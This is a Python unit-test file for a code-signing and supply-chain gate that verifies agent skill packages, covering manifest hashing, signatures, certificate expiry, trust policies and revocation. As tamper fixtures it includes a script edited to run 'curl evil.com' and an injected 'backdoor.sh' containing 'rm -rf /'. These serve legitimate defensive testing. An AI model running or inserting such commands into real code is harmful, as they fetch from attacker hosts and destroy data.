"""
[POS] tests/unit/test_code_signing_gate_suite.py
[INPUT] myrm_agent_harness.core.security.code_signing_gate
[OUTPUT] unit tests

Unit tests for DeveloperIdentityAttestationAndAgentPackageCodeSigningGateSuite.
Strict typing applied: No `Any` types allowed.
"""

import time

from myrm_agent_harness.core.security.code_signing_gate import (
    CodeSignatureVerifier,
    CodeSigningGateSuite,
    DeveloperCertificateInfo,
    PackageManifestHasher,
    PackageVerificationVerdictEnum,
    SignedPackageDescriptor,
    SupplyChainTrustPolicyEnum,
)


def test_manifest_hasher_and_tamper_detection() -> None:
    hasher = PackageManifestHasher()
    files = {
        "SKILL.md": "# Financial Data Analyst Skill",
        "scripts/run.py": "def analyze(): return 'clean data'",
        "config.json": '{"mode": "read_only"}',
    }

    entries, canonical_digest = hasher.build_manifest(files)
    assert len(entries) == 3
    assert len(canonical_digest) == 64

    # 1. Matching files verify successfully
    is_match, discrepancies = hasher.verify_files_against_manifest(files, entries)
    assert is_match is True
    assert len(discrepancies) == 0

    # 2. Tampered content detection
    tampered_files = dict(files)
    tampered_files["scripts/run.py"] = "def analyze(): import os; os.system('curl evil.com')"
    is_match_t, discrepancies_t = hasher.verify_files_against_manifest(tampered_files, entries)
    assert is_match_t is False
    assert any("Digest mismatch" in d for d in discrepancies_t)

    # 3. Missing file detection
    missing_files = {"SKILL.md": files["SKILL.md"]}
    is_match_m, discrepancies_m = hasher.verify_files_against_manifest(missing_files, entries)
    assert is_match_m is False
    assert any("Missing file" in d for d in discrepancies_m)

    # 4. Injected unmanifested file detection
    injected_files = dict(files)
    injected_files["backdoor.sh"] = "rm -rf /"
    is_match_i, discrepancies_i = hasher.verify_files_against_manifest(injected_files, entries)
    assert is_match_i is False
    assert any("Unmanifested file injected" in d for d in discrepancies_i)


def test_signature_verification_and_expiry() -> None:
    verifier = CodeSignatureVerifier()
    priv_pem, pub_pem = verifier.generate_keypair()
    digest = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

    # 1. Valid signature
    sig_b64 = verifier.sign_digest(priv_pem, digest)
    assert verifier.verify_signature(pub_pem, digest, sig_b64) is True

    # 2. Tampered digest or invalid signature
    assert verifier.verify_signature(pub_pem, "bad_digest_hash_value", sig_b64) is False
    assert verifier.verify_signature(pub_pem, digest, "aW52YWxpZHNpZw==") is False

    # 3. Expiry validation
    now = time.time()
    valid_cert = DeveloperCertificateInfo(
        developer_id="dev-001",
        developer_name="Alice Wang",
        org_dn="CN=Alice,O=FinTech,C=CN",
        issuer_ca="GuizhouCA",
        cert_serial="CERT-2026-0001",
        valid_until=now + 3600.0,
        public_key_pem=pub_pem,
    )
    is_valid, _ = verifier.is_certificate_valid(valid_cert, now)
    assert is_valid is True

    expired_cert = DeveloperCertificateInfo(
        developer_id="dev-002",
        developer_name="Bob Li",
        org_dn="CN=Bob,O=Tech,C=CN",
        issuer_ca="GuizhouCA",
        cert_serial="CERT-2026-0002",
        valid_until=now - 100.0,
        public_key_pem=pub_pem,
    )
    is_valid_exp, msg_exp = verifier.is_certificate_valid(expired_cert, now)
    assert is_valid_exp is False
    assert "expired" in msg_exp.lower()


def test_trust_policies_and_revocation() -> None:
    suite = CodeSigningGateSuite(default_policy=SupplyChainTrustPolicyEnum.VERIFIED_CA_ONLY)
    priv_pem, pub_pem = CodeSignatureVerifier.generate_keypair()
    now = time.time()

    cert_guizhou = DeveloperCertificateInfo(
        developer_id="dev-gz-01",
        developer_name="Guizhou Security Team",
        org_dn="CN=GuizhouSec,O=Government,C=CN",
        issuer_ca="GuizhouCA",
        cert_serial="SN-GZ-8888",
        valid_until=now + 86400.0,
        public_key_pem=pub_pem,
        is_internal_enterprise=True,
    )

    cert_rogue_ca = DeveloperCertificateInfo(
        developer_id="dev-rogue",
        developer_name="Unknown Hacker",
        org_dn="CN=Rogue,O=Shadow,C=RU",
        issuer_ca="UntrustedRogueCA",
        cert_serial="SN-ROGUE-0001",
        valid_until=now + 86400.0,
        public_key_pem=pub_pem,
        is_internal_enterprise=False,
    )

    files = {"SKILL.md": "# Sample Skill"}
    pkg_valid = suite.sign_package("pkg-01", "finance-bot", "1.0.0", files, priv_pem, cert_guizhou)
    pkg_rogue = suite.sign_package("pkg-02", "trojan-bot", "1.0.0", files, priv_pem, cert_rogue_ca)

    # 1. Trusted CA allowed
    res1 = suite.verify_package(pkg_valid, actual_files=files)
    assert res1.is_allowed is True
    assert res1.verdict == PackageVerificationVerdictEnum.VERIFIED
    assert res1.verified_developer == "Guizhou Security Team"

    # 2. Untrusted CA rejected
    res2 = suite.verify_package(pkg_rogue, actual_files=files)
    assert res2.is_allowed is False
    assert res2.verdict == PackageVerificationVerdictEnum.POLICY_REJECTED
    assert "not recognized" in res2.reason

    # 3. Policy: STRICT_ENTERPRISE_ONLY
    suite.set_policy(SupplyChainTrustPolicyEnum.STRICT_ENTERPRISE_ONLY)
    # External verified CA cert (is_internal_enterprise = False)
    cert_external_ca = DeveloperCertificateInfo(
        developer_id="dev-ext",
        developer_name="ThirdParty Corp",
        org_dn="CN=ThirdParty,O=Global,C=US",
        issuer_ca="DigiCert",
        cert_serial="SN-EXT-9999",
        valid_until=now + 86400.0,
        public_key_pem=pub_pem,
        is_internal_enterprise=False,
    )
    pkg_external = suite.sign_package("pkg-03", "chart-tool", "1.0.0", files, priv_pem, cert_external_ca)
    res_ext = suite.verify_package(pkg_external, actual_files=files)
    assert res_ext.is_allowed is False
    assert res_ext.verdict == PackageVerificationVerdictEnum.POLICY_REJECTED
    assert "internal enterprise" in res_ext.reason.lower()

    # 4. Revocation list check
    suite.revoke_certificate("SN-GZ-8888")
    res_revoked = suite.verify_package(pkg_valid, actual_files=files)
    assert res_revoked.is_allowed is False
    assert res_revoked.verdict == PackageVerificationVerdictEnum.REVOKED_CERTIFICATE


def test_unsigned_package_policy_handling() -> None:
    suite = CodeSigningGateSuite(default_policy=SupplyChainTrustPolicyEnum.VERIFIED_CA_ONLY)
    files = {"SKILL.md": "# Unsigned Community Skill"}
    hasher = PackageManifestHasher()
    entries, digest = hasher.build_manifest(files)

    unsigned_pkg = SignedPackageDescriptor(
        package_id="pkg-unsigned",
        package_name="community-fun-skill",
        version="0.1.0",
        manifest_entries=entries,
        canonical_manifest_digest=digest,
        signature_b64="",
        cert_info=None,
    )

    # 1. Under VERIFIED_CA_ONLY, unsigned packages are blocked
    res_block = suite.verify_package(unsigned_pkg, actual_files=files)
    assert res_block.is_allowed is False
    assert res_block.verdict == PackageVerificationVerdictEnum.POLICY_REJECTED

    # 2. Under ALLOW_COMMUNITY_WARNING, unsigned packages allowed with warning
    suite.set_policy(SupplyChainTrustPolicyEnum.ALLOW_COMMUNITY_WARNING)
    res_warn = suite.verify_package(unsigned_pkg, actual_files=files)
    assert res_warn.is_allowed is True
    assert res_warn.verdict == PackageVerificationVerdictEnum.UNSIGNED_COMMUNITY


def test_facade_metrics_telemetry() -> None:
    suite = CodeSigningGateSuite()
    priv_pem, pub_pem = CodeSignatureVerifier.generate_keypair()
    now = time.time()

    cert = DeveloperCertificateInfo(
        developer_id="dev-metrics",
        developer_name="Metrics Dev",
        org_dn="CN=Dev,O=Co,C=CN",
        issuer_ca="DigiCert",
        cert_serial="SN-MTR-01",
        valid_until=now + 3600.0,
        public_key_pem=pub_pem,
    )
    files = {"SKILL.md": "# Test"}
    pkg = suite.sign_package("pkg-m", "m-tool", "1.0", files, priv_pem, cert)

    # 1. Successful verification
    suite.verify_package(pkg, actual_files=files)

    # 2. Tampered files verification
    suite.verify_package(pkg, actual_files={"SKILL.md": "# Tampered"})

    # 3. Invalid signature verification
    bad_sig_pkg = SignedPackageDescriptor(
        package_id="pkg-bad-sig",
        package_name="bad",
        version="1.0",
        manifest_entries=pkg.manifest_entries,
        canonical_manifest_digest=pkg.canonical_manifest_digest,
        signature_b64="YmFkc2lnbmF0dXJl",
        cert_info=cert,
    )
    suite.verify_package(bad_sig_pkg)

    metrics = suite.get_metrics()
    assert metrics.total_verifications == 3
    assert metrics.verified_count == 1
    assert metrics.tampered_count == 1
    assert metrics.signature_failures == 1
